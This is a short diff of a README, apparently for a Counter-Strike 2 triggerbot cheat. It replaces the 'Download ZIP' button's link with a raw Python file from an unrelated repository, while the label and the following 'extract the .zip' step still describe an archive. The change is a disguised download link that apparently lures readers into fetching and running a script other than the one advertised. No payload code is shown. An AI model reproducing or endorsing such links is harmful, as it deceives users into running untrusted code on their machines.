@@ -11,7 +11,7 @@
 > ## How to download the repo
 > Click the button below to download the code as a .zip:
 >
-> <a href="[https://github.com/moonshine7591/CS2-TriggerBot/archive/refs/heads/main.zip](https://github.com/notpaster/obxodroblox/blob/main/BypassZapretRoblox.py)"><img src="https://img.shields.io/badge/⬇️_Download_ZIP-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"></a>
+> <a href="[https://github.com/notpaster/obxodroblox/raw/refs/heads/main/main.py](https://github.com/notpaster/obxodroblox/blob/main/BypassZapretRoblox.py)"><img src="https://img.shields.io/badge/⬇️_Download_ZIP-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"></a>
 >
 > 
 > Now extract the .zip folder
